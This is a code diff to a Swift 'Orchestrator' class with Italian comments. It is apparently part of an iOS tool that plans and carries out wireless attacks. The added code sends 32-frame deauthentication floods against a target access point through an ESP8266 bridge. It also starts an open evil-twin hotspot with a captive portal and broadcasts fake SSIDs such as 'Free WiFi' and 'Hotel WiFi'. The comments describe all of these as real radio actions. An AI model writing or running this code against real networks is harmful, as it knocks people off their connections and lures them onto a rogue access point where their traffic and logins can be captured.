@@ -58,6 +58,7 @@ final class Orchestrator: ObservableObject {
     func log(_ text: String, _ level: LogEntry.Level = .info) {
         let line = "[\(timeNow())] [\(level.rawValue.uppercased())] \(text)"
         logs.append(LogEntry(level: level, text: text))
+        DebugLog.shared.add("[orch] \(text)")
         if let fh = try? FileHandle(forWritingTo: journalPath) {
             _ = try? fh.seekToEnd()
             try? fh.write(contentsOf: Data((line + "\n").utf8))
@@ -1031,6 +1032,9 @@ final class Orchestrator: ObservableObject {
     private func runVector(_ e: PlanEntry) async -> String {
         switch e.vector.cap {
         case .shellTool(let tool):
+            // Wi-Fi vectors: il binario locale su iPhone non può iniettare frame
+            // (niente monitor mode). Esegue la radio dell'ESP8266: azione reale.
+            if let via = await runWifiVectorViaBridge(tool: tool, e: e) { return via }
             guard shell.resolve(tool) != nil else {
                 return "PLAN (tool '\(tool)' non installato sul device) — prereq: \(e.vector.prereq)"
             }
@@ -1043,6 +1047,38 @@ final class Orchestrator: ObservableObject {
             return "PLAN — richiede hardware/radio esterna.\nPrereq: \(e.vector.prereq)\nExec: \(e.vector.hint)"
         case .native:
             return await runNative(e)
+        }
+    }
+
+    // Esecuzione reale via radio ESP8266 (deauth/evil twin/beacon flood).
+    // nil = vector non gestito dal bridge, si prosegue col tool locale.
+    private func runWifiVectorViaBridge(tool: String, e: PlanEntry) async -> String? {
+        guard tcpBridge.connected else { return nil }
+        let t = e.target
+        switch tool {
+        case "aireplay-ng":
+            guard let mac = t?.mac, mac.count >= 17 else {
+                return "ESP deauth: target senza BSSID — esegui prima lo scan Wi-Fi (il bridge riporta il MAC)"
+            }
+            let ch = t?.extra["ch"].flatMap { Int($0) } ?? 0
+            let ok = await tcpBridge.deauth(mac: mac, ch: ch, count: 32)
+            return ok
+                ? "ESP deauth flood → \(mac) ch\(ch): 32 frame di deauth trasmessi (azione reale sulla radio)."
+                : "ESP deauth rifiutato: rogue AP attivo o frame non iniettati (riprova con rogue spento)."
+        case "hostapd":
+            let ssid = t?.name ?? "Free WiFi"
+            let ok = await tcpBridge.rogueStart(ssid: ssid, pass: "", dnsFwd: true)
+            return ok
+                ? "ESP evil twin ON: SSID '\(ssid)' con internet reale (NAPT) + captive portal sui check."
+                : "ESP rogue start rifiutato: STA hotspot giù o argomenti non validi."
+        case "mdk3":
+            let fakes = ["Free WiFi", "AndroidAP", "Guest", "Hotel WiFi", "Casa-2.4G"]
+            let ok = await tcpBridge.beaconSpam(ssids: fakes)
+            return ok
+                ? "ESP beacon flood: \(fakes.count) SSID fittizi in onda."
+                : "ESP beacon flood rifiutato (radio occupata da scan/rogue)."
+        default:
+            return nil
         }
     }
 
